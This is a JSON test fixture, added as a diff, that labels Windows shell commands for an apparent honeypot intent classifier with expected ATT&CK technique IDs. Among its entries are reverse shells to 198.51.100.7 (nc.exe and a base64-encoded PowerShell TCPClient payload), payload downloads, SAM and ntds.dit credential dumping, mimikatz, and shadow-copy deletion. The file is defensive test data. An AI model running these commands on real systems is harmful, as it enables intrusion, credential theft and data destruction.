@@ -1,0 +1,364 @@
+{
+  "note": "Rank 7: shared by ai-engine/tests/test_windows_persona.py and backend/tests/rank7WindowsPersona.test.js so the Python and JavaScript Windows intent rules stay identical. Commands are attempts against a simulated shell. Rank 8: F5 cases (an encoded PowerShell command is a reverse shell only with an explicit -enc/-EncodedCommand flag AND a reverse-shell payload); wevtutil cl is defense impairment, not destruction. windows_attack: expected Windows ATT&CK ids per command (Python and JS must both produce them).",
+  "windows": [
+    [
+      "whoami",
+      "RECONNAISSANCE"
+    ],
+    [
+      "systeminfo",
+      "RECONNAISSANCE"
+    ],
+    [
+      "ipconfig /all",
+      "RECONNAISSANCE"
+    ],
+    [
+      "tasklist /svc",
+      "RECONNAISSANCE"
+    ],
+    [
+      "net user",
+      "RECONNAISSANCE"
+    ],
+    [
+      "net localgroup administrators",
+      "RECONNAISSANCE"
+    ],
+    [
+      "sc query",
+      "RECONNAISSANCE"
+    ],
+    [
+      "Get-ComputerInfo",
+      "RECONNAISSANCE"
+    ],
+    [
+      "powershell -c Get-Process",
+      "RECONNAISSANCE"
+    ],
+    [
+      "cmd /c ver",
+      "RECONNAISSANCE"
+    ],
+    [
+      "type C:\\Windows\\System32\\config\\SAM",
+      "CREDENTIAL_HARVEST"
+    ],
+    [
+      "reg save hklm\\sam C:\\Temp\\s",
+      "CREDENTIAL_HARVEST"
+    ],
+    [
+      "type C:\\inetpub\\wwwroot\\web.config",
+      "CREDENTIAL_HARVEST"
+    ],
+    [
+      "type C:\\Windows\\Panther\\unattend.xml",
+      "CREDENTIAL_HARVEST"
+    ],
+    [
+      "certutil -urlcache -f http://198.51.100.7/a.exe a.exe",
+      "MALWARE_DOWNLOAD"
+    ],
+    [
+      "powershell iwr http://198.51.100.7/x.ps1 -OutFile x.ps1",
+      "MALWARE_DOWNLOAD"
+    ],
+    [
+      "bitsadmin /transfer j http://198.51.100.7/a C:\\Temp\\a",
+      "MALWARE_DOWNLOAD"
+    ],
+    [
+      "net localgroup administrators eve /add",
+      "PRIVILEGE_ESCALATION"
+    ],
+    [
+      "schtasks /create /tn upd /tr C:\\Temp\\a.exe /sc onlogon",
+      "PERSISTENCE"
+    ],
+    [
+      "sc create upd binPath= C:\\Temp\\a.exe",
+      "PERSISTENCE"
+    ],
+    [
+      "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v u /d C:\\Temp\\a.exe",
+      "PERSISTENCE"
+    ],
+    [
+      "net user eve P@ss123 /add",
+      "PERSISTENCE"
+    ],
+    [
+      "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+      "UNKNOWN"
+    ],
+    [
+      "vssadmin delete shadows /all /quiet",
+      "DESTRUCTION"
+    ],
+    [
+      "wevtutil cl Security",
+      "UNKNOWN"
+    ],
+    [
+      "dir",
+      "UNKNOWN"
+    ],
+    [
+      "cd C:\\Users",
+      "UNKNOWN"
+    ],
+    [
+      "echo hello",
+      "UNKNOWN"
+    ],
+    [
+      "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=",
+      "REVERSE_SHELL"
+    ],
+    [
+      "PowerShell.exe -NoP -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=",
+      "REVERSE_SHELL"
+    ],
+    [
+      "powershell -ec \"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=\"",
+      "REVERSE_SHELL"
+    ],
+    [
+      "POWERSHELL -ENC JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=",
+      "REVERSE_SHELL"
+    ],
+    [
+      "powershell -c \"New-Object System.Net.Sockets.TCPClient('198.51.100.7',4444)\"",
+      "REVERSE_SHELL"
+    ],
+    [
+      "nc.exe 198.51.100.7 4444 -e cmd.exe",
+      "REVERSE_SHELL"
+    ],
+    [
+      "powershell -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==",
+      "RECONNAISSANCE"
+    ],
+    [
+      "powershell -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABoAGUAbABsAG8A",
+      "UNKNOWN"
+    ],
+    [
+      "powershell -c Get-Service",
+      "RECONNAISSANCE"
+    ],
+    [
+      "echo -e aaaaaaaaaaaaaaaaaaaa",
+      "UNKNOWN"
+    ],
+    [
+      "findstr -e somethingverylongpattern file.txt",
+      "UNKNOWN"
+    ],
+    [
+      "powershell -encrypted aaaaaaaaaaaaaaaaaaaaaaaa",
+      "UNKNOWN"
+    ],
+    [
+      "type encodedcommand-notes.txt",
+      "UNKNOWN"
+    ],
+    [
+      "echo powershell -enc",
+      "UNKNOWN"
+    ],
+    [
+      "powershell -enc !!!notbase64!!!",
+      "UNKNOWN"
+    ],
+    [
+      "ping -n 4 198.51.100.7",
+      "UNKNOWN"
+    ],
+    [
+      "netstat -ano",
+      "RECONNAISSANCE"
+    ]
+  ],
+  "linux_unchanged": [
+    "uname -a",
+    "id",
+    "cat /etc/passwd",
+    "wget http://198.51.100.7/x",
+    "chmod +x a",
+    "crontab -e",
+    "bash -i",
+    "rm -rf /tmp/x",
+    "ls -la",
+    "ps aux",
+    "hostname",
+    "ping -c 1 10.0.0.1",
+    "netstat -an",
+    "dir",
+    "arp -a",
+    "free -m",
+    "w"
+  ],
+  "windows_attack": {
+    "whoami": [
+      "T1033"
+    ],
+    "systeminfo": [
+      "T1082"
+    ],
+    "ipconfig /all": [
+      "T1016"
+    ],
+    "tasklist /svc": [
+      "T1057"
+    ],
+    "net user": [
+      "T1087.001"
+    ],
+    "net localgroup administrators": [
+      "T1069.001"
+    ],
+    "sc query": [
+      "T1007"
+    ],
+    "Get-ComputerInfo": [
+      "T1082"
+    ],
+    "powershell -c Get-Process": [
+      "T1057",
+      "T1059.001"
+    ],
+    "cmd /c ver": [
+      "T1082",
+      "T1059.003"
+    ],
+    "type C:\\Windows\\System32\\config\\SAM": [
+      "T1003.002"
+    ],
+    "reg save hklm\\sam C:\\Temp\\s": [
+      "T1003.002"
+    ],
+    "type C:\\inetpub\\wwwroot\\web.config": [
+      "T1552.001"
+    ],
+    "type C:\\Windows\\Panther\\unattend.xml": [
+      "T1552.001"
+    ],
+    "certutil -urlcache -f http://198.51.100.7/a.exe a.exe": [
+      "T1105"
+    ],
+    "powershell iwr http://198.51.100.7/x.ps1 -OutFile x.ps1": [
+      "T1105",
+      "T1059.001"
+    ],
+    "bitsadmin /transfer j http://198.51.100.7/a C:\\Temp\\a": [
+      "T1105"
+    ],
+    "net localgroup administrators eve /add": [
+      "T1069.001",
+      "T1098"
+    ],
+    "schtasks /create /tn upd /tr C:\\Temp\\a.exe /sc onlogon": [
+      "T1053.005"
+    ],
+    "sc create upd binPath= C:\\Temp\\a.exe": [
+      "T1543.003"
+    ],
+    "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v u /d C:\\Temp\\a.exe": [
+      "T1547.001"
+    ],
+    "net user eve P@ss123 /add": [
+      "T1087.001",
+      "T1136.001"
+    ],
+    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA": [
+      "T1059.001",
+      "T1027"
+    ],
+    "vssadmin delete shadows /all /quiet": [
+      "T1490"
+    ],
+    "wevtutil cl Security": [
+      "T1685.005"
+    ],
+    "dir": [
+      "T1083"
+    ],
+    "cd C:\\Users": [],
+    "echo hello": [],
+    "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=": [
+      "T1059.001",
+      "T1027"
+    ],
+    "PowerShell.exe -NoP -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=": [
+      "T1059.001",
+      "T1027"
+    ],
+    "powershell -ec \"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=\"": [
+      "T1059.001",
+      "T1027"
+    ],
+    "POWERSHELL -ENC JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADgALgA1ADEALgAxADAAMAAuADcAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=": [
+      "T1059.001",
+      "T1027"
+    ],
+    "powershell -c \"New-Object System.Net.Sockets.TCPClient('198.51.100.7',4444)\"": [
+      "T1059.001",
+      "T1095"
+    ],
+    "nc.exe 198.51.100.7 4444 -e cmd.exe": [],
+    "powershell -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==": [
+      "T1059.001",
+      "T1027"
+    ],
+    "powershell -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABoAGUAbABsAG8A": [
+      "T1059.001",
+      "T1027"
+    ],
+    "powershell -c Get-Service": [
+      "T1007",
+      "T1059.001"
+    ],
+    "echo -e aaaaaaaaaaaaaaaaaaaa": [],
+    "findstr -e somethingverylongpattern file.txt": [],
+    "powershell -encrypted aaaaaaaaaaaaaaaaaaaaaaaa": [
+      "T1059.001"
+    ],
+    "type encodedcommand-notes.txt": [],
+    "echo powershell -enc": [
+      "T1059.001"
+    ],
+    "powershell -enc !!!notbase64!!!": [
+      "T1059.001"
+    ],
+    "ping -n 4 198.51.100.7": [
+      "T1018"
+    ],
+    "netstat -ano": [
+      "T1049"
+    ],
+    "icacls C:\\Temp /grant Everyone:F": [
+      "T1222.001"
+    ],
+    "mimikatz sekurlsa::logonpasswords": [
+      "T1003.001"
+    ],
+    "copy C:\\Windows\\NTDS\\ntds.dit C:\\Temp": [
+      "T1003.003"
+    ],
+    "cmdkey /list": [
+      "T1555.004"
+    ],
+    "del /s /q C:\\Users\\*": [
+      "T1485"
+    ],
+    "Get-ChildItem C:\\": [
+      "T1083"
+    ],
+    "ping dc01": [
+      "T1018"
+    ]
+  }
+}
